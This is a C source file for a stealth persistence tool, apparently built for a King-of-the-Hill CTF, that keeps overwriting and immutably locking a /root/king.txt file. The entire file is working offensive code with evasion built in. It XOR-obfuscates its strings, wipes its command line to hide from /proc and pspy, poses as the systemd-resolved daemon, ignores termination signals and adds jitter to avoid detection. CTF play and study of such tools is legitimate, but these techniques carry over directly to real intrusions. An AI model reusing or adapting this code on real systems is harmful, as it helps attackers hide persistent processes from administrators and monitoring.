/*
 * kingmaker — stealth king.txt persistence
 * Lernaean Siege KoTH — Team handle: ThundersFist
 *
 * Compile: gcc -O2 -s -static kingmaker.c -o <name> && strip <name>
 * Run:     ./<name> [king_path] [username]
 *
 * Obfuscation summary:
 *   - username + king path stored XOR-obfuscated (no plaintext in .rodata)
 *   - argv[] wiped after parse so /proc/<pid>/cmdline & pspy see nothing
 *   - argv[0] + comm masqueraded as an innocuous system daemon
 *   - daemonizes (fork + setsid), ignores signals, self-heals king file
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <linux/fs.h>

#define XOR_KEY 0x5A
#define IMMUTABLE_FLAG 16

/* XOR-obfuscated defaults (decode at runtime; NUL terminator left intact) */
static unsigned char enc_username[] = {0x0E,0x32,0x2F,0x34,0x3E,0x3F,0x28,0x29,0x1C,0x33,0x29,0x2E,0x00};
static unsigned char enc_kingpath[] = {0x75,0x28,0x35,0x35,0x2E,0x75,0x31,0x33,0x34,0x3D,0x74,0x2E,0x22,0x2E,0x00};

/* Default masquerade title. On game day, pass argv[3] set to a daemon that
 * ACTUALLY exists on the target (ideally one already running). */
static const char default_title[] = "/lib/systemd/systemd-resolved";

static void dec(unsigned char *b, size_t n) {
    for (size_t i = 0; i < n; i++) b[i] ^= XOR_KEY;
}

/* zero out the whole argv region so cmdline is empty */
static void wipe_argv(int argc, char **argv) {
    int space = 0;
    for (int i = 0; i < argc; i++) space += strlen(argv[i]) + 1;
    if (argv[0]) memset(argv[0], '\0', space);
}

static void masquerade(int argc, char **argv, const char *title) {
    const char *t = (title && title[0]) ? title : default_title;
    char comm[16];
    memset(comm, 0, sizeof(comm));
    strncpy(comm, t, sizeof(comm) - 1);
    /* keep comm free of a leading slash for the 15-char /proc/<pid>/comm */
    prctl(PR_SET_NAME, comm + (comm[0] == '/'), 0, 0, 0);

    wipe_argv(argc, argv);
    if (argv[0]) strncpy(argv[0], t, strlen(t));
}

static void set_flags(const char *path, int flag) {
    FILE *fp = fopen(path, "r");
    if (!fp) return;
    int v = flag;
    ioctl(fileno(fp), FS_IOC_SETFLAGS, &v);
    fclose(fp);
}

static void write_king(const char *path, const char *name) {
    set_flags(path, 0);                         /* unlock */
    chmod(path, S_IWUSR | S_IRUSR);
    char tmp[560];
    snprintf(tmp, sizeof(tmp), "%s.t", path);
    FILE *fp = fopen(tmp, "w");
    if (fp) {
        fputs(name, fp);
        fclose(fp);
    }
    chmod(tmp, S_IRUSR | S_IWUSR);
    /* atomic replace — concurrent readers (scorer) never see a truncated file */
    if (rename(tmp, path) == 0) {
        chmod(path, S_IRUSR | S_IRGRP | S_IROTH);
        set_flags(path, IMMUTABLE_FLAG);        /* lock (immutable) */
    }
}

int main(int argc, char *argv[]) {
    /* decode defaults (leave NUL terminators intact) */
    dec(enc_username, sizeof(enc_username) - 1);
    dec(enc_kingpath, sizeof(enc_kingpath) - 1);

    /* copy args before wiping argv */
    char king_path[512];
    char user[128];
    char title[128];
    snprintf(king_path, sizeof(king_path), "%s", (argc > 1 && argv[1][0]) ? argv[1] : (char *)enc_kingpath);
    snprintf(user, sizeof(user), "%s", (argc > 2 && argv[2][0]) ? argv[2] : (char *)enc_username);
    snprintf(title, sizeof(title), "%s", (argc > 3 && argv[3][0]) ? argv[3] : "");

    if (fork() != 0) exit(0);        /* daemonize */
    setsid();
    srand(getpid());

    for (int i = 1; i < 16; i++) signal(i, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    masquerade(argc, argv, title[0] ? title : NULL);

    for (;;) {
        write_king(king_path, user);
        usleep(800 + (rand() % 700)); /* slight jitter to avoid a fixed signature */
    }
    return 0;
}
